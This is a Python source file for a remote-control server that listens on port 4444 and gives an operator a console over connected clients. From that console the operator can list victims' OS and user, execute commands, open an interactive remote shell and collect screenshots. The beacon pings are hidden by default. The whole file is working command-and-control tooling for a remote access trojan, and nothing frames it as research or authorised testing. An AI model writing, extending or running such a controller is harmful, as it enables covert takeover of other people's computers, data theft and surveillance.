import socket
import threading
import json
import base64
import os
import subprocess
import time
from datetime import datetime
import struct
import queue
import select

class RemoteServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}  # client_id: {'socket': socket, 'address': address, 'info': info}
        self.client_responses = {}  # client_id: queue of responses
        self.command_queues = {}  # client_id: queue of commands to send
        self.server_socket = None
        self.running = False
        self.lock = threading.Lock()
        self.quiet_mode = True  # Set to False to see all ping messages
        self.last_ping_time = {}  # Track last ping time per client
        
    def start(self):
        """Start the server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            print(f"[*] Server listening on {self.host}:{self.port}")
            print("[*] Waiting for client connections...")
            
            # Start connection handler
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Start command interface
            self.command_interface()
            
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            self.stop()
    
    def accept_connections(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                print(f"[+] New connection from {client_address}")
                
                # Set timeout for initial handshake
                client_socket.settimeout(10)
                
                # Get client info
                client_info = self.receive_data(client_socket)
                if client_info:
                    client_id = client_info.get('client_id', str(client_address))
                    
                    with self.lock:
                        self.clients[client_id] = {
                            'socket': client_socket,
                            'address': client_address,
                            'info': client_info,
                            'connected': True,
                            'last_seen': time.time()
                        }
                        self.command_queues[client_id] = queue.Queue()
                        self.client_responses[client_id] = queue.Queue()
                        self.last_ping_time[client_id] = time.time()
                    
                    print(f"[+] Client {client_id} connected - {client_info.get('os', 'Unknown')}")
                    
                    # Start handler for this client
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_id, client_socket)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[!] Connection error: {e}")
    
    def handle_client(self, client_id, client_socket):
        """Handle communication with a specific client"""
        client_socket.settimeout(1)  # Short timeout for responsive handling
        
        while self.running:
            try:
                # Check for commands to send
                if client_id in self.command_queues:
                    try:
                        command = self.command_queues[client_id].get_nowait()
                        if not self.quiet_mode:
                            print(f"[*] Sending command to {client_id}: {command.get('type', 'unknown')}")
                        self.send_data(client_socket, command)
                        
                        # Wait for response with timeout
                        response = self.receive_data_with_timeout(client_socket, timeout=30)
                        if response:
                            if not self.quiet_mode:
                                print(f"[*] Received response from {client_id}")
                            self.client_responses[client_id].put(response)
                        else:
                            if not self.quiet_mode:
                                print(f"[!] No response from {client_id}")
                            
                    except queue.Empty:
                        pass  # No commands to send
                
                # Also listen for spontaneous messages from client
                try:
                    data = self.receive_data(client_socket, timeout=0.5)
                    if data:
                        response_type = data.get('type', 'unknown')
                        
                        # Filter ping messages
                        if response_type == 'ping':
                            # Only log first ping or if quiet mode is off
                            current_time = time.time()
                            last_ping = self.last_ping_time.get(client_id, 0)
                            
                            if not self.quiet_mode or current_time - last_ping > 300:  # Log every 5 minutes in quiet mode
                                print(f"[*] Ping from {client_id} - connection alive")
                                self.last_ping_time[client_id] = current_time
                            
                            # Update last seen but don't queue ping as response
                            with self.lock:
                                if client_id in self.clients:
                                    self.clients[client_id]['last_seen'] = time.time()
                            continue
                        
                        # For non-ping messages, log and queue
                        if not self.quiet_mode:
                            print(f"[*] Received data from {client_id}: {response_type}")
                        self.client_responses[client_id].put(data)
                        
                except socket.timeout:
                    pass
                
                # Update last seen
                with self.lock:
                    if client_id in self.clients:
                        self.clients[client_id]['last_seen'] = time.time()
                
                time.sleep(0.1)
                
            except socket.timeout:
                continue
            except Exception as e:
                if not self.quiet_mode:
                    print(f"[!] Error with client {client_id}: {e}")
                break
        
        # Clean up disconnected client
        with self.lock:
            if client_id in self.clients:
                del self.clients[client_id]
            if client_id in self.command_queues:
                del self.command_queues[client_id]
            if client_id in self.client_responses:
                del self.client_responses[client_id]
            if client_id in self.last_ping_time:
                del self.last_ping_time[client_id]
        
        print(f"[-] Client {client_id} disconnected")
        if client_socket:
            client_socket.close()
    
    def send_command(self, client_id, command_type, data):
        """Send command to client and wait for response"""
        if client_id not in self.clients:
            print(f"[!] Client {client_id} not connected")
            return None
        
        command = {
            'type': command_type,
            'data': data,
            'timestamp': datetime.now().isoformat(),
            'command_id': int(time.time() * 1000)  # Unique command ID
        }
        
        # Clear any old responses (except pings which are filtered)
        if client_id in self.client_responses:
            while not self.client_responses[client_id].empty():
                try:
                    response = self.client_responses[client_id].get_nowait()
                    # Only discard if it's a ping
                    if response.get('type') != 'ping':
                        # Put it back if it's not a ping (shouldn't happen)
                        self.client_responses[client_id].put(response)
                        break
                except queue.Empty:
                    break
        
        # Send command
        self.command_queues[client_id].put(command)
        
        # Wait for response with timeout
        start_time = time.time()
        timeout = 60  # Increased timeout for commands that might take time
        
        while time.time() - start_time < timeout:
            if client_id in self.client_responses:
                try:
                    response = self.client_responses[client_id].get(timeout=0.5)
                    # Skip ping responses
                    if response.get('type') == 'ping':
                        continue
                    return response
                except queue.Empty:
                    pass
            time.sleep(0.1)
        
        print(f"[!] Timeout waiting for response from {client_id}")
        return None
    
    def receive_data_with_timeout(self, sock, timeout=30):
        """Receive data with proper timeout handling"""
        sock.settimeout(timeout)
        try:
            return self.receive_data(sock)
        except socket.timeout:
            return None
        finally:
            sock.settimeout(1)  # Reset to short timeout
    
    def send_data(self, sock, data):
        """Send JSON data over socket"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            # Send length first
            sock.sendall(struct.pack('>I', len(json_data)))
            # Send data
            sock.sendall(json_data)
            return True
        except Exception as e:
            if not self.quiet_mode:
                print(f"[!] Send error: {e}")
            return False
    
    def receive_data(self, sock, timeout=None):
        """Receive JSON data from socket"""
        if timeout:
            sock.settimeout(timeout)
        
        try:
            # Receive length
            raw_len = self.recv_all(sock, 4)
            if not raw_len or len(raw_len) != 4:
                return None
            msg_len = struct.unpack('>I', raw_len)[0]
            
            # Receive data
            data = self.recv_all(sock, msg_len)
            if data and len(data) == msg_len:
                return json.loads(data.decode('utf-8', errors='ignore'))
            
        except socket.timeout:
            return None
        except Exception as e:
            return None
        finally:
            if timeout:
                sock.settimeout(1)  # Reset to default
    
    def recv_all(self, sock, n):
        """Helper function to receive exactly n bytes"""
        data = bytearray()
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)
    
    def command_interface(self):
        """Interactive command interface"""
        print("\n" + "="*60)
        print("Remote Control Server - Command Interface")
        print("="*60)
        print("Commands:")
        print("  list              - List connected clients")
        print("  cmd <client> <command> - Execute command on client")
        print("  shell <client>    - Start interactive shell")
        print("  screenshot <client> - Take screenshot from client")
        print("  quiet <on/off>    - Toggle quiet mode (default: on)")
        print("  quit              - Exit server")
        print("="*60)
        print("[*] Quiet mode is ON - ping messages are suppressed")
        print("="*60)
        
        while self.running:
            try:
                command = input("\nserver> ").strip()
                
                if not command:
                    continue
                
                if command.lower() == 'quit':
                    print("[*] Shutting down server...")
                    self.running = False
                    break
                
                elif command.lower() == 'list':
                    self.list_clients()
                
                elif command.startswith('cmd '):
                    self.handle_cmd_command(command)
                
                elif command.startswith('shell '):
                    self.handle_shell_command(command)
                
                elif command.startswith('screenshot '):
                    self.handle_screenshot_command(command)
                
                elif command.startswith('quiet '):
                    self.handle_quiet_command(command)
                
                else:
                    print("[!] Unknown command")
                    
            except KeyboardInterrupt:
                print("\n[*] Shutting down server...")
                self.running = False
                break
            except Exception as e:
                print(f"[!] Command error: {e}")
    
    def list_clients(self):
        """List connected clients"""
        with self.lock:
            if not self.clients:
                print("[*] No clients connected")
            else:
                print("\nConnected Clients:")
                print("-" * 60)
                for client_id, client_info in self.clients.items():
                    last_ping = self.last_ping_time.get(client_id, 0)
                    time_since_ping = time.time() - last_ping
                    
                    print(f"ID: {client_id}")
                    print(f"  Address: {client_info['address']}")
                    print(f"  OS: {client_info['info'].get('os', 'Unknown')}")
                    print(f"  User: {client_info['info'].get('user', 'Unknown')}")
                    print(f"  Last Seen: {time.time() - client_info['last_seen']:.1f}s ago")
                    print(f"  Last Ping: {time_since_ping:.1f}s ago")
                    print(f"  Status: {'Active' if time_since_ping < 60 else 'Idle'}")
                    print("-" * 60)
    
    def handle_cmd_command(self, command):
        """Handle cmd command"""
        parts = command.split(' ', 2)
        if len(parts) >= 3:
            client_id = parts[1]
            cmd = parts[2]
            
            print(f"[*] Sending command to {client_id}: {cmd}")
            response = self.send_command(client_id, 'execute', cmd)
            
            if response:
                self.handle_response(client_id, response)
            else:
                print(f"[!] No response from {client_id}")
        else:
            print("[!] Usage: cmd <client_id> <command>")
    
    def handle_shell_command(self, command):
        """Handle interactive shell command"""
        parts = command.split(' ', 1)
        if len(parts) >= 2:
            client_id = parts[1]
            
            if client_id not in self.clients:
                print(f"[!] Client {client_id} not found")
                return
            
            print(f"[*] Starting interactive shell with {client_id}")
            print("[*] Type 'exit' to return to server interface")
            
            while True:
                try:
                    shell_cmd = input(f"shell@{client_id}> ").strip()
                    if shell_cmd.lower() == 'exit':
                        break
                    
                    if shell_cmd:
                        response = self.send_command(client_id, 'shell', shell_cmd)
                        if response:
                            self.handle_response(client_id, response)
                        else:
                            print(f"[!] No response from {client_id}")
                            
                except KeyboardInterrupt:
                    print("\n[*] Exiting shell...")
                    break
                except Exception as e:
                    print(f"[!] Shell error: {e}")
        else:
            print("[!] Usage: shell <client_id>")
    
    def handle_screenshot_command(self, command):
        """Handle screenshot command"""
        parts = command.split(' ', 1)
        if len(parts) >= 2:
            client_id = parts[1]
            
            print(f"[*] Requesting screenshot from {client_id}")
            response = self.send_command(client_id, 'screenshot', '')
            
            if response:
                self.handle_response(client_id, response)
            else:
                print(f"[!] No response from {client_id}")
        else:
            print("[!] Usage: screenshot <client_id>")
    
    def handle_quiet_command(self, command):
        """Handle quiet mode command"""
        parts = command.split(' ', 1)
        if len(parts) >= 2:
            mode = parts[1].lower()
            if mode in ['on', 'true', '1', 'yes']:
                self.quiet_mode = True
                print("[*] Quiet mode: ON (ping messages suppressed)")
            elif mode in ['off', 'false', '0', 'no']:
                self.quiet_mode = False
                print("[*] Quiet mode: OFF (all messages shown)")
            else:
                print("[!] Usage: quiet <on/off>")
        else:
            # Toggle current mode
            self.quiet_mode = not self.quiet_mode
            status = "ON" if self.quiet_mode else "OFF"
            print(f"[*] Quiet mode toggled: {status}")
    
    def handle_response(self, client_id, response):
        """Handle response from client"""
        response_type = response.get('type', 'unknown')
        
        if response_type == 'cmd_result':
            print(f"\n[CMD Result from {client_id}]")
            print("-" * 60)
            print(response.get('data', 'No output'))
            print("-" * 60)
            
        elif response_type == 'screenshot':
            screenshot_data = response.get('data', '')
            if screenshot_data:
                try:
                    # Decode and save screenshot
                    import zlib
                    img_data = zlib.decompress(base64.b64decode(screenshot_data))
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"screenshot_{client_id}_{timestamp}.png"
                    
                    with open(filename, 'wb') as f:
                        f.write(img_data)
                    
                    print(f"[+] Screenshot saved as {filename}")
                    
                    # Try to display the image
                    try:
                        from PIL import Image
                        from io import BytesIO
                        img = Image.open(BytesIO(img_data))
                        img.show()
                    except:
                        print("[*] Could not display image (PIL not installed)")
                        
                except Exception as e:
                    print(f"[!] Failed to save screenshot: {e}")
            else:
                print("[!] No screenshot data received")
        
        elif response_type == 'shell_result':
            print(f"\n[SHELL Result from {client_id}]")
            print("-" * 60)
            print(response.get('data', 'No output'))
            print("-" * 60)
        
        elif response_type == 'error':
            print(f"[!] Error from {client_id}: {response.get('data', 'Unknown error')}")
        
        elif response_type == 'ping':
            # Should not reach here as pings are filtered earlier
            pass
        
        else:
            print(f"[?] Unknown response type from {client_id}: {response_type}")
            print(f"    Data: {response.get('data', 'No data')}")
    
    def stop(self):
        """Stop the server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        # Close all client connections
        with self.lock:
            for client_id, client_info in list(self.clients.items()):
                if client_info['socket']:
                    try:
                        client_info['socket'].close()
                    except:
                        pass
        
        print("[*] Server stopped")

if __name__ == "__main__":
    server = RemoteServer()
    server.start()
